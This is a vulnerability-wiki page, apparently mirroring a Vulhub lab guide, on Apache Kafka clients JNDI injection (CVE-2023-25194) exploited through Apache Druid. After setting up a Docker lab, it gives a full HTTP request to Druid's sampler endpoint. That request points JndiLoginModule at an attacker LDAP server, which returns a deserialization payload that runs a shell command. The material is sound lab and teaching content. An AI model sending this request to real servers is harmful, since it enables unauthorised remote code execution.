<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/kafka/CVE-2023-25194/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache Kafka Clients JNDI injection RCE (CVE-2023-25194) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache Kafka Clients JNDI injection RCE (CVE-2023-25194)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache Kafka Clients JNDI注入漏洞 (CVE-2023-25194)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../jupyter/notebook-rce/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../jupyter/notebook-rce/README.zh-cn/" class="btn btn-xs btn-link">
        Jupyter Notebook 未授权访问漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-kafka-clients-jndi-injection-rce-cve-2023-25194">Apache Kafka Clients JNDI injection RCE (CVE-2023-25194)<a class="headerlink" href="#apache-kafka-clients-jndi-injection-rce-cve-2023-25194" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache Kafka is an open-source distributed event streaming platform that is used for real-time data streaming and processing. Kafka clients are a set of Java libraries that allow you to produce and consume messages from Apache Kafka.</p>
<p>In the version prior to 3.3.2, there is a JNDI injection issue in the Apache Kafka clients if an attacker is able to set the <code>sasl.jaas.config</code> property for any of the connector's Kafka clients to <code>com.sun.security.auth.module.JndiLoginModule</code>. It will allow the server to connect to the attacker's LDAP server and deserialize the LDAP response, which the attacker can use to execute java deserialization gadget chains on the Kafka connect server. Attacker can cause unrestricted deserialization of untrusted data (or) RCE vulnerability when there are gadgets in the classpath.</p>
<p>Because this issue exists in a Java library, we have to find a real world software that is using the kafka-clients.</p>
<p>This software is Apache Druid, which is depended on kafka-clients to connect to one of its datasources. This guide is demonstrates how to exploit CVE-2023-25194 in the Apache Druid server.</p>
<p>References:</p>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25194">https://nvd.nist.gov/vuln/detail/CVE-2023-25194</a></li>
<li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml</a></li>
<li><a href="https://hackerone.com/reports/1529790">https://hackerone.com/reports/1529790</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute following command to start a Apache Druid server 25.0.0 which is depended on kafka-clients 3.3.1:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After server is started, you can see the home page of Apache Druid on <code>http://your-ip:8888</code>.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>For vulnerability exploitation, you can use <a href="https://github.com/vulhub/java-chains">Java Chains</a>. First, follow the <a href="https://java-chains.vulhub.org/docs/guide">Quick Start</a> guide to set up Java Chains. Then, refer to the <a href="https://java-chains.vulhub.org/docs/module/jndi#jndibasicpayload">JNDI Basic Exploitation Guide</a> and following screenshot to configure the command <code>id &gt; /tmp/success</code>, generate a JNDI LDAP URL Payload that will be used in the attack.</p>
<p><img alt="" src="1.png" /></p>
<p>Paste the evil LDAP url into following request and send it:</p>
<div class="highlight"><pre><span></span><code>POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: your-ip:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1405

{
    &quot;type&quot;:&quot;kafka&quot;,
    &quot;spec&quot;:{
        &quot;type&quot;:&quot;kafka&quot;,
        &quot;ioConfig&quot;:{
            &quot;type&quot;:&quot;kafka&quot;,
            &quot;consumerProperties&quot;:{
                &quot;bootstrap.servers&quot;:&quot;127.0.0.1:6666&quot;,
                &quot;sasl.mechanism&quot;:&quot;SCRAM-SHA-256&quot;,
                &quot;security.protocol&quot;:&quot;SASL_SSL&quot;,
                &quot;sasl.jaas.config&quot;:&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://java-chains:50389/x\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;
            },
            &quot;topic&quot;:&quot;test&quot;,
            &quot;useEarliestOffset&quot;:true,
            &quot;inputFormat&quot;:{
                &quot;type&quot;:&quot;regex&quot;,
                &quot;pattern&quot;:&quot;([\\s\\S]*)&quot;,
                &quot;listDelimiter&quot;:&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;,
                &quot;columns&quot;:[
                    &quot;raw&quot;
                ]
            }
        },
        &quot;dataSchema&quot;:{
            &quot;dataSource&quot;:&quot;sample&quot;,
            &quot;timestampSpec&quot;:{
                &quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,
                &quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;
            },
            &quot;dimensionsSpec&quot;:{

            },
            &quot;granularitySpec&quot;:{
                &quot;rollup&quot;:false
            }
        },
        &quot;tuningConfig&quot;:{
            &quot;type&quot;:&quot;kafka&quot;
        }
    },
    &quot;samplerConfig&quot;:{
        &quot;numRows&quot;:500,
        &quot;timeoutMs&quot;:15000
    }
}
</code></pre></div>
<p><img alt="" src="2.png" /></p>
<p>As you can see, <code>id &gt; /tmp/success</code> was executed successfully:</p>
<p><img alt="" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache Kafka Clients JNDI注入漏洞 (CVE-2023-25194)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../jupyter/notebook-rce/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../jupyter/notebook-rce/README.zh-cn/" class="btn btn-xs btn-link">
        Jupyter Notebook 未授权访问漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>